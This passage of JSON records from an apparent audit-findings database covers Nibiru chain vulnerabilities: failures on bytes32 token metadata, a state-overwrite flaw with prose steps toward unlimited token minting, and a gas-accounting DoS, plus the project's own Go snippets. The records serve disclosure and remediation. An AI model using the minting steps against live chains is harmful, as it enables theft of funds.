Main Invariants\n\n.. snip 3. Any bank coin on Nibiru can be used to create a canonical ERC20 representation, for which the EVM itself (the module account) will be the owner. 4. Similar to (3), any ERC20 on Nibiru can be used to create a canonical bank coin representation. The owner of the ERC20 is unbounded, while only the EVM Module account can mint the bank coin representation produced.\n```\n", "recommendation_md": "## Recommended Mitigation Steps\n\nConsider outrightly stating that not all tokens are supported, or support two types of metadata, i.e `string` and `bytes`.\n", "poc_md": "## Proof of Concept\n\nFirst note that from the readMe, Nibiru intends to be compatible with any ERC20, see:\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/README.md#L119-L124\n\n```markdown\n### General questions\n\n| Question                   | Answer                    |\n| -------------------------- | ------------------------- |\n| ERC20 used by the protocol | Any (all possible ERC20s) |\n```\n\nNow take a look at https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/erc20.go#L147-L164:\n\n```go\n\nfunc (k Keeper) LoadERC20Name(\n\tctx sdk.Context, abi *gethabi.ABI, erc20 gethcommon.Address,\n) (out string, err error) {\n\treturn k.LoadERC20String(ctx, abi, erc20, \"name\")\n}\n\nfunc (k Keeper) LoadERC20Symbol(\n\tctx sdk.Context, abi *gethabi.ABI, erc20 gethcommon.Address,\n) (out string, err error) {\n\treturn k.LoadERC20String(ctx, abi, erc20, \"symbol\")\n}\n\nfunc (k Keeper) LoadERC20Decimals(\n\tctx sdk.Context, abi *gethabi.ABI, erc20 gethcommon.Address,\n) (out uint8, err error) {\n\treturn k.loadERC20Uint8(ctx, abi, erc20, \"decimals\")\n}\n```\n\nThese are helper functions that are used to load the name, symbol, and decimals of an ERC20 token contract and they help within NIbiru's scope in ensuring functionalities execute as expected, for eg we can see it being used in funtoken's implementation:\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/funtoken_from_erc20.go#L26-L52\n\n```go\nfunc (k Keeper) FindERC20Metadata(\n\tctx sdk.Context,\n\tcontract gethcommon.Address,\n) (info *ERC20Metadata, err error) {\n\t// Load name, symbol, decimals\n\tname, err := k.LoadERC20Name(ctx, embeds.SmartContract_ERC20Minter.ABI, contract)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\tsymbol, err := k.LoadERC20Symbol(ctx, embeds.SmartContract_ERC20Minter.ABI, contract)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\tdecimals, err := k.LoadERC20Decimals(ctx, embeds.SmartContract_ERC20Minter.ABI, contract)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\treturn &ERC20Metadata{\n\t\tName:     name,\n\t\tSymbol:   symbol,\n\t\tDecimals: decimals,\n\t}, nil\n}\n\n```\n\nIssue however is that there is a wrong assumption that all tokens return their metadata using `string` which is wrong, this then means that when tokens that have their metadata as `bytes` are used, the functionality would be broken due to a revert that occurs when trying to load the string from here, because of the type mismatch, i.e `bytes` != `string`.\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/erc20.go#L166-L194\n\n```go\nfunc (k Keeper) LoadERC20String(\n\tctx sdk.Context,\n\terc20Abi *gethabi.ABI,\n\terc20Contract gethcommon.Address,\n\tmethodName string,\n) (out string, err error) {\n\tres, err := k.CallContract(\n\t\tctx,\n\t\terc20Abi,\n\t\tevm.EVM_MODULE_ADDRESS,\n\t\t&erc20Contract,\n\t\tfalse,\n\t\tErc20GasLimitQuery,\n\t\tmethodName,\n\t)\n\tif err != nil {\n\t\treturn out, err\n\t}\n\n\terc20Val := new(ERC20String)\n\terr = erc20Abi.UnpackIntoInterface(\n\t\terc20Val, methodName, res.Ret,\n\t)\n\tif err != nil {\n\t\treturn out, err\n\t}\n\treturn erc20Val.Value, err\n}\n\n```\n\nEvidently we expect a string value from `ERC20String` for `erc20Val` however for tokens such as [MKR](https://etherscan.io/address/0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2#readContract#F7) that have metadata fields `(name / symbol)` encoded as `bytes32` instead of a `string`, this flow wouldn't work.\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/README.md#L119-L124\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/funtoken_from_erc20.go#L26-L52\n\n**container:**\n# Vulnerability details\n", "full_markdown_body": "https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/README.md#L119-L124\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/funtoken_from_erc20.go#L26-L52\n\n\n# Vulnerability details\n\n\n## Proof of Concept\n\nFirst note that from the readMe, Nibiru intends to be compatible with any ERC20, see:\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/README.md#L119-L124\n\n```markdown\n### General questions\n\n| Question                   | Answer                    |\n| -------------------------- | ------------------------- |\n| ERC20 used by the protocol | Any (all possible ERC20s) |\n```\n\nNow take a look at https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/erc20.go#L147-L164:\n\n```go\n\nfunc (k Keeper) LoadERC20Name(\n\tctx sdk.Context, abi *gethabi.ABI, erc20 gethcommon.Address,\n) (out string, err error) {\n\treturn k.LoadERC20String(ctx, abi, erc20, \"name\")\n}\n\nfunc (k Keeper) LoadERC20Symbol(\n\tctx sdk.Context, abi *gethabi.ABI, erc20 gethcommon.Address,\n) (out string, err error) {\n\treturn k.LoadERC20String(ctx, abi, erc20, \"symbol\")\n}\n\nfunc (k Keeper) LoadERC20Decimals(\n\tctx sdk.Context, abi *gethabi.ABI, erc20 gethcommon.Address,\n) (out uint8, err error) {\n\treturn k.loadERC20Uint8(ctx, abi, erc20, \"decimals\")\n}\n```\n\nThese are helper functions that are used to load the name, symbol, and decimals of an ERC20 token contract and they help within NIbiru's scope in ensuring functionalities execute as expected, for eg we can see it being used in funtoken's implementation:\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/funtoken_from_erc20.go#L26-L52\n\n```go\nfunc (k Keeper) FindERC20Metadata(\n\tctx sdk.Context,\n\tcontract gethcommon.Address,\n) (info *ERC20Metadata, err error) {\n\t// Load name, symbol, decimals\n\tname, err := k.LoadERC20Name(ctx, embeds.SmartContract_ERC20Minter.ABI, contract)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\tsymbol, err := k.LoadERC20Symbol(ctx, embeds.SmartContract_ERC20Minter.ABI, contract)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\tdecimals, err := k.LoadERC20Decimals(ctx, embeds.SmartContract_ERC20Minter.ABI, contract)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\treturn &ERC20Metadata{\n\t\tName:     name,\n\t\tSymbol:   symbol,\n\t\tDecimals: decimals,\n\t}, nil\n}\n\n```\n\nIssue however is that there is a wrong assumption that all tokens return their metadata using `string` which is wrong, this then means that when tokens that have their metadata as `bytes` are used, the functionality would be broken due to a revert that occurs when trying to load the string from here, because of the type mismatch, i.e `bytes` != `string`.\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/erc20.go#L166-L194\n\n```go\nfunc (k Keeper) LoadERC20String(\n\tctx sdk.Context,\n\terc20Abi *gethabi.ABI,\n\terc20Contract gethcommon.Address,\n\tmethodName string,\n) (out string, err error) {\n\tres, err := k.CallContract(\n\t\tctx,\n\t\terc20Abi,\n\t\tevm.EVM_MODULE_ADDRESS,\n\t\t&erc20Contract,\n\t\tfalse,\n\t\tErc20GasLimitQuery,\n\t\tmethodName,\n\t)\n\tif err != nil {\n\t\treturn out, err\n\t}\n\n\terc20Val := new(ERC20String)\n\terr = erc20Abi.UnpackIntoInterface(\n\t\terc20Val, methodName, res.Ret,\n\t)\n\tif err != nil {\n\t\treturn out, err\n\t}\n\treturn erc20Val.Value, err\n}\n\n```\n\nEvidently we expect a string value from `ERC20String` for `erc20Val` however for tokens such as [MKR](https://etherscan.io/address/0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2#readContract#F7) that have metadata fields `(name / symbol)` encoded as `bytes32` instead of a `string`, this flow wouldn't work.\n\n## Impact\n\n> 2  Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n\nSince we have broken integration for some supported tokens cause when creating the fun token mapping for these tokens we meet an error [here in the function `createFunTokenFromERC20`](https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/funtoken_from_erc20.go#L104).\n\n> NB: [`createFunTokenFromERC20` and `createFunTokenFromCoin` are both called in `CreateFunToken()`](https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/msg_server.go#L424-L465).\n\nAnd this window also breaks one of the core invariants stated by Nibiru, (see \"4\" below):\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/README.md#L179\n\n```markdown\n## Main Invariants\n\n.. snip 3. Any bank coin on Nibiru can be used to create a canonical ERC20 representation, for which the EVM itself (the module account) will be the owner. 4. Similar to (3), any ERC20 on Nibiru can be used to create a canonical bank coin representation. The owner of the ERC20 is unbounded, while only the EVM Module account can mint the bank coin representation produced.\n```\n\n## Recommended Mitigation Steps\n\nConsider outrightly stating that not all tokens are supported, or support two types of metadata, i.e `string` and `bytes`.\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/README.md#L119-L124\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/funtoken_from_erc20.go#L26-L52\n\n\n# Vulnerability details\n\n\n## Proof of Concept\n\nFirst note that from the readMe, Nibiru intends to be compatible with any ERC20, see:\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/README.md#L119-L124\n\n```markdown\n### General questions\n\n| Question                   | Answer                    |\n| -------------------------- | ------------------------- |\n| ERC20 used by the protocol | Any (all possible ERC20s) |\n```\n\nNow take a look at https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/erc20.go#L147-L164:\n\n```go\n\nfunc (k Keeper) LoadERC20Name(\n\tctx sdk.Context, abi *gethabi.ABI, erc20 gethcommon.Address,\n) (out string, err error) {\n\treturn k.LoadERC20String(ctx, abi, erc20, \"name\")\n}\n\nfunc (k Keeper) LoadERC20Symbol(\n\tctx sdk.Context, abi *gethabi.ABI, erc20 gethcommon.Address,\n) (out string, err error) {\n\treturn k.LoadERC20String(ctx, abi, erc20, \"symbol\")\n}\n\nfunc (k Keeper) LoadERC20Decimals(\n\tctx sdk.Context, abi *gethabi.ABI, erc20 gethcommon.Address,\n) (out uint8, err error) {\n\treturn k.loadERC20Uint8(ctx, abi, erc20, \"decimals\")\n}\n```\n\nThese are helper functions that are used to load the name, symbol, and decimals of an ERC20 token contract and they help within NIbiru's scope in ensuring functionalities execute as expected, for eg we can see it being used in funtoken's implementation:\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/funtoken_from_erc20.go#L26-L52\n\n```go\nfunc (k Keeper) FindERC20Metadata(\n\tctx sdk.Context,\n\tcontract gethcommon.Address,\n) (info *ERC20Metadata, err error) {\n\t// Load name, symbol, decimals\n\tname, err := k.LoadERC20Name(ctx, embeds.SmartContract_ERC20Minter.ABI, contract)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\tsymbol, err := k.LoadERC20Symbol(ctx, embeds.SmartContract_ERC20Minter.ABI, contract)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\tdecimals, err := k.LoadERC20Decimals(ctx, embeds.SmartContract_ERC20Minter.ABI, contract)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\treturn &ERC20Metadata{\n\t\tName:     name,\n\t\tSymbol:   symbol,\n\t\tDecimals: decimals,\n\t}, nil\n}\n\n```\n\nIssue however is that there is a wrong assumption that all tokens return their metadata using `string` which is wrong, this then means that when tokens that have their metadata as `bytes` are used, the functionality would be broken due to a revert that occurs when trying to load the string from here, because of the type mismatch, i.e `bytes` != `string`.\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/erc20.go#L166-L194\n\n```go\nfunc (k Keeper) LoadERC20String(\n\tctx sdk.Context,\n\terc20Abi *gethabi.ABI,\n\terc20Contract gethcommon.Address,\n\tmethodName string,\n) (out string, err error) {\n\tres, err := k.CallContract(\n\t\tctx,\n\t\terc20Abi,\n\t\tevm.EVM_MODULE_ADDRESS,\n\t\t&erc20Contract,\n\t\tfalse,\n\t\tErc20GasLimitQuery,\n\t\tmethodName,\n\t)\n\tif err != nil {\n\t\treturn out, err\n\t}\n\n\terc20Val := new(ERC20String)\n\terr = erc20Abi.UnpackIntoInterface(\n\t\terc20Val, methodName, res.Ret,\n\t)\n\tif err != nil {\n\t\treturn out, err\n\t}\n\treturn erc20Val.Value, err\n}\n\n```\n\nEvidently we expect a string value from `ERC20String` for `erc20Val` however for tokens such as [MKR](https://etherscan.io/address/0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2#readContract#F7) that have metadata fields `(name / symbol)` encoded as `bytes32` instead of a `string`, this flow wouldn't work.\n\n## Impact\n\n> 2  Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n\nSince we have broken integration for some supported tokens cause when creating the fun token mapping for these tokens we meet an error [here in the function `createFunTokenFromERC20`](https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/funtoken_from_erc20.go#L104).\n\n> NB: [`createFunTokenFromERC20` and `createFunTokenFromCoin` are both called in `CreateFunToken()`](https://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/x/evm/keeper/msg_server.go#L424-L465).\n\nAnd this window also breaks one of the core invariants stated by Nibiru, (see \"4\" below):\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/8ed91a036f664b421182e183f19f6cef1a4e28ea/README.md#L179\n\n```markdown\n## Main Invariants\n\n.. snip 3. Any bank coin on Nibiru can be used to create a canonical ERC20 representation, for which the EVM itself (the module account) will be the owner. 4. Similar to (3), any ERC20 on Nibiru can be used to create a canonical bank coin representation. The owner of the ERC20 is unbounded, while only the EVM Module account can mint the bank coin representation produced.\n```\n\n## Recommended Mitigation Steps\n\nConsider outrightly stating that not all tokens are supported, or support two types of metadata, i.e `string` and `bytes`.\n"}, "severity": null, "difficulty": null, "type": "qa", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/NibiruChain/nibiru", "org": "NibiruChain", "name": "nibiru", "commit": "f3cbcaec58f23c54f6b75204b0c4009856b47250", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-11-nibiru-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:15.445890+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:15.453827+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": null, "Difficulty": null, "Type": "qa", "Finding ID": null, "Target": null, "Severity_normalized": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-11-nibiru-findings-024", "doc_id": "github:code-423n4/2024-11-nibiru-findings", "finding_index": 24, "page_start": null, "title": "Inconsistent State Management: EthereumTx StateDB Overriding CallContract Results", "short_summary": null, "description_md": "## Finding Description and Impact\n\nWhen a precompile is invoked, the context (`ctx`) is cached, and the state database (`statedb`) commits to this cache, ensuring that precompiles operate with the most up-to-date context and data. During the execution of the precompile, the context can be modified, but these changes are not fully reflected in the state database, except for bank-related modifications.\n\n```go\nfunc (s *StateDB) Commit() error {\n\tif s.writeToCommitCtxFromCacheCtx != nil {\n\t\ts.writeToCommitCtxFromCacheCtx()\n\t}\n\treturn s.commitCtx(s.GetEvmTxContext())\n}\n```\n\nThe snippet above shows that at the end of the transaction, the `evmTxCtx` is updated to the cached context (`cachedCtx`) before the state changes are committed by the `statedb.commitCtx`. However, the issue arises because **EvmState and Account modifications made within `cachedCtx` can be overwritten when `statedb.commitCtx` commits the state changes**. This creates a situation where certain state changes, particularly those made by precompiles like FunToken, can be lost or corrupted.\n\nFor example, the **FunToken precompile** may call `CallContract` and modify `EvmState`'s `AccState` after the account state object has been added to the `statedb` and dirtied.\n", "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/statedb/statedb.go#L515-L586\n\n\n# Vulnerability details\n\n## Finding Description and Impact\n\nWhen a precompile is invoked, the context (`ctx`) is cached, and the state database (`statedb`) commits to this cache, ensuring that precompiles operate with the most up-to-date context and data. During the execution of the precompile, the context can be modified, but these changes are not fully reflected in the state database, except for bank-related modifications.\n\n```go\nfunc (s *StateDB) Commit() error {\n\tif s.writeToCommitCtxFromCacheCtx != nil {\n\t\ts.writeToCommitCtxFromCacheCtx()\n\t}\n\treturn s.commitCtx(s.GetEvmTxContext())\n}\n```\n\nThe snippet above shows that at the end of the transaction, the `evmTxCtx` is updated to the cached context (`cachedCtx`) before the state changes are committed by the `statedb.commitCtx`. However, the issue arises because **EvmState and Account modifications made within `cachedCtx` can be overwritten when `statedb.commitCtx` commits the state changes**. This creates a situation where certain state changes, particularly those made by precompiles like FunToken, can be lost or corrupted.\n\nFor example, the **FunToken precompile** may call `CallContract` and modify `EvmState`'s `AccState` after the account state object has been added to the `statedb` and dirtied.\n\n### Impact\n1. **Unlimited Token Minting**: The state inconsistencies could allow the minting of unlimited FunTokens, as state changes made during precompile execution may be overwritten.\n2. **State Corruption**: The precompile could corrupt the state of any contract by exploiting the `statedb`'s lack of awareness of the modifications made during precompile execution.\n3. **Malicious Contract Exploits**: An attacker could create a malicious ERC20 token, which, when added to FunToken, could leverage the `MaliciousERC20.transfer` method as a callback to perform arbitrary operations on any contract, including state manipulation.\n4. **Locking Factories**: A lot of factories use create which depends on their nonce being incremented in sequence. If a nonce is reused, the transaction would fail because there's already a contract where they want to deploy.\n\n## Proof of Concept\n\n* CreateFunToken: Add Nibi, or any valuable coin to FunToken\n* ConvertCoinToEvm: Convert Nibi to ERC20\n* Create eth tx that performs this in the smart contract\n    * transfer WEI to add object to statedb\n    * Convert X ERC20 to Nibi through `FunToken.sendToBank`. It would reduce balanceOf contract by X amount, and mint X Nibi coins to the contract.\n* At the End of EthereumTx, statedb would commit the balanceOf contract to the initial balance before `FunToken.sendToBank`\n\nThe transfer to add object to statedb can also be done after Precompile is called because `statedb` would get account and object from `evmTxCtx` which is lagging `cachedCtx`\n\n## Recommended mitigation steps\n\nMake sure EthereumTx.statedb knows what CallContracts in Precompile have done. And it has to work well when reverts occur.\n", "sections": {"description_md": "## Finding Description and Impact\n\nWhen a precompile is invoked, the context (`ctx`) is cached, and the state database (`statedb`) commits to this cache, ensuring that precompiles operate with the most up-to-date context and data. During the execution of the precompile, the context can be modified, but these changes are not fully reflected in the state database, except for bank-related modifications.\n\n```go\nfunc (s *StateDB) Commit() error {\n\tif s.writeToCommitCtxFromCacheCtx != nil {\n\t\ts.writeToCommitCtxFromCacheCtx()\n\t}\n\treturn s.commitCtx(s.GetEvmTxContext())\n}\n```\n\nThe snippet above shows that at the end of the transaction, the `evmTxCtx` is updated to the cached context (`cachedCtx`) before the state changes are committed by the `statedb.commitCtx`. However, the issue arises because **EvmState and Account modifications made within `cachedCtx` can be overwritten when `statedb.commitCtx` commits the state changes**. This creates a situation where certain state changes, particularly those made by precompiles like FunToken, can be lost or corrupted.\n\nFor example, the **FunToken precompile** may call `CallContract` and modify `EvmState`'s `AccState` after the account state object has been added to the `statedb` and dirtied.\n", "impact_md": "### Impact\n1. **Unlimited Token Minting**: The state inconsistencies could allow the minting of unlimited FunTokens, as state changes made during precompile execution may be overwritten.\n2. **State Corruption**: The precompile could corrupt the state of any contract by exploiting the `statedb`'s lack of awareness of the modifications made during precompile execution.\n3. **Malicious Contract Exploits**: An attacker could create a malicious ERC20 token, which, when added to FunToken, could leverage the `MaliciousERC20.transfer` method as a callback to perform arbitrary operations on any contract, including state manipulation.\n4. **Locking Factories**: A lot of factories use create which depends on their nonce being incremented in sequence. If a nonce is reused, the transaction would fail because there's already a contract where they want to deploy.\n", "recommendation_md": "## Recommended mitigation steps\n\nMake sure EthereumTx.statedb knows what CallContracts in Precompile have done. And it has to work well when reverts occur.\n", "poc_md": "## Proof of Concept\n\n* CreateFunToken: Add Nibi, or any valuable coin to FunToken\n* ConvertCoinToEvm: Convert Nibi to ERC20\n* Create eth tx that performs this in the smart contract\n    * transfer WEI to add object to statedb\n    * Convert X ERC20 to Nibi through `FunToken.sendToBank`. It would reduce balanceOf contract by X amount, and mint X Nibi coins to the contract.\n* At the End of EthereumTx, statedb would commit the balanceOf contract to the initial balance before `FunToken.sendToBank`\n\nThe transfer to add object to statedb can also be done after Precompile is called because `statedb` would get account and object from `evmTxCtx` which is lagging `cachedCtx`\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/statedb/statedb.go#L515-L586\n\n**container:**\n# Vulnerability details\n", "full_markdown_body": "https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/statedb/statedb.go#L515-L586\n\n\n# Vulnerability details\n\n## Finding Description and Impact\n\nWhen a precompile is invoked, the context (`ctx`) is cached, and the state database (`statedb`) commits to this cache, ensuring that precompiles operate with the most up-to-date context and data. During the execution of the precompile, the context can be modified, but these changes are not fully reflected in the state database, except for bank-related modifications.\n\n```go\nfunc (s *StateDB) Commit() error {\n\tif s.writeToCommitCtxFromCacheCtx != nil {\n\t\ts.writeToCommitCtxFromCacheCtx()\n\t}\n\treturn s.commitCtx(s.GetEvmTxContext())\n}\n```\n\nThe snippet above shows that at the end of the transaction, the `evmTxCtx` is updated to the cached context (`cachedCtx`) before the state changes are committed by the `statedb.commitCtx`. However, the issue arises because **EvmState and Account modifications made within `cachedCtx` can be overwritten when `statedb.commitCtx` commits the state changes**. This creates a situation where certain state changes, particularly those made by precompiles like FunToken, can be lost or corrupted.\n\nFor example, the **FunToken precompile** may call `CallContract` and modify `EvmState`'s `AccState` after the account state object has been added to the `statedb` and dirtied.\n\n### Impact\n1. **Unlimited Token Minting**: The state inconsistencies could allow the minting of unlimited FunTokens, as state changes made during precompile execution may be overwritten.\n2. **State Corruption**: The precompile could corrupt the state of any contract by exploiting the `statedb`'s lack of awareness of the modifications made during precompile execution.\n3. **Malicious Contract Exploits**: An attacker could create a malicious ERC20 token, which, when added to FunToken, could leverage the `MaliciousERC20.transfer` method as a callback to perform arbitrary operations on any contract, including state manipulation.\n4. **Locking Factories**: A lot of factories use create which depends on their nonce being incremented in sequence. If a nonce is reused, the transaction would fail because there's already a contract where they want to deploy.\n\n## Proof of Concept\n\n* CreateFunToken: Add Nibi, or any valuable coin to FunToken\n* ConvertCoinToEvm: Convert Nibi to ERC20\n* Create eth tx that performs this in the smart contract\n    * transfer WEI to add object to statedb\n    * Convert X ERC20 to Nibi through `FunToken.sendToBank`. It would reduce balanceOf contract by X amount, and mint X Nibi coins to the contract.\n* At the End of EthereumTx, statedb would commit the balanceOf contract to the initial balance before `FunToken.sendToBank`\n\nThe transfer to add object to statedb can also be done after Precompile is called because `statedb` would get account and object from `evmTxCtx` which is lagging `cachedCtx`\n\n## Recommended mitigation steps\n\nMake sure EthereumTx.statedb knows what CallContracts in Precompile have done. And it has to work well when reverts occur.\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/statedb/statedb.go#L515-L586\n\n\n# Vulnerability details\n\n## Finding Description and Impact\n\nWhen a precompile is invoked, the context (`ctx`) is cached, and the state database (`statedb`) commits to this cache, ensuring that precompiles operate with the most up-to-date context and data. During the execution of the precompile, the context can be modified, but these changes are not fully reflected in the state database, except for bank-related modifications. \n\n```go\nfunc (s *StateDB) Commit() error {\n\tif s.writeToCommitCtxFromCacheCtx != nil {\n\t\ts.writeToCommitCtxFromCacheCtx()\n\t}\n\treturn s.commitCtx(s.GetEvmTxContext())\n}\n```\n\nThe snippet above shows that at the end of the transaction, the `evmTxCtx` is updated to the cached context (`cachedCtx`) before the state changes are committed by the `statedb.commitCtx`. However, the issue arises because **EvmState and Account modifications made within `cachedCtx` can be overwritten when `statedb.commitCtx` commits the state changes**. This creates a situation where certain state changes, particularly those made by precompiles like FunToken, can be lost or corrupted.\n\nFor example, the **FunToken precompile** may call `CallContract` and modify `EvmState`'s `AccState` after the account state object has been added to the `statedb` and dirtied.\n\n### Impact\n1. **Unlimited Token Minting**: The state inconsistencies could allow the minting of unlimited FunTokens, as state changes made during precompile execution may be overwritten.\n2. **State Corruption**: The precompile could corrupt the state of any contract by exploiting the `statedb`'s lack of awareness of the modifications made during precompile execution.\n3. **Malicious Contract Exploits**: An attacker could create a malicious ERC20 token, which, when added to FunToken, could leverage the `MaliciousERC20.transfer` method as a callback to perform arbitrary operations on any contract, including state manipulation.\n4. **Locking Factories**: A lot of factories use create which depends on their nonce being incremented in sequence. If a nonce is reused, the transaction would fail because there's already a contract where they want to deploy.\n\n## Proof of Concept\n\n* CreateFunToken: Add Nibi, or any valuable coin to FunToken\n* ConvertCoinToEvm: Convert Nibi to ERC20\n* Create eth tx that performs this in the smart contract\n    * transfer WEI to add object to statedb\n    * Convert X ERC20 to Nibi through `FunToken.sendToBank`. It would reduce balanceOf contract by X amount, and mint X Nibi coins to the contract.\n* At the End of EthereumTx, statedb would commit the balanceOf contract to the initial balance before `FunToken.sendToBank` \n\nThe transfer to add object to statedb can also be done after Precompile is called because `statedb` would get account and object from `evmTxCtx` which is lagging `cachedCtx`\n\n## Recommended mitigation steps\n\nMake sure EthereumTx.statedb knows what CallContracts in Precompile have done. And it has to work well when reverts occur.\n"}, "severity": "High", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/NibiruChain/nibiru", "org": "NibiruChain", "name": "nibiru", "commit": "f3cbcaec58f23c54f6b75204b0c4009856b47250", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-11-nibiru-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:15.445890+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:15.453827+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "High"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-11-nibiru-findings-025", "doc_id": "github:code-423n4/2024-11-nibiru-findings", "finding_index": 25, "page_start": null, "title": "Gas is not consumed when precompile method fail, allowing resource consumption related DOS", "short_summary": null, "description_md": "## Finding description and impact\n\nWhen a precompile method fails (e.g., due to an error), **gas is not consumed** as the method returns early before invoking the gas consumption logic. This issue affects all three precompiles in the system:\n\n- **FunToken**\n- **Wasm**\n- **Oracle**\n\nThe lack of gas consumption on failure allows attackers to perform denial-of-service (DoS) attacks by exploiting the failure conditions to consume excessive resources without paying for them. The code snippet below demonstrates the issue:\n\n```go\nif err != nil {\n    return nil, err\n}\n\n// Gas consumed by a local gas meter\ncontract.UseGas(startResult.CacheCtx.GasMeter().GasConsumed())\n```\n", "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/precompile/funtoken.go#L79-L84\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/precompile/wasm.go#L71-L79\nhttps://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/precompile/oracle.go#L60-L64\n\n\n# Vulnerability details\n\n## Finding description and impact\n\nWhen a precompile method fails (e.g., due to an error), **gas is not consumed** as the method returns early before invoking the gas consumption logic. This issue affects all three precompiles in the system:\n\n- **FunToken**\n- **Wasm**\n- **Oracle**\n\nThe lack of gas consumption on failure allows attackers to perform denial-of-service (DoS) attacks by exploiting the failure conditions to consume excessive resources without paying for them. The code snippet below demonstrates the issue:\n\n```go\nif err != nil {\n    return nil, err\n}\n\n// Gas consumed by a local gas 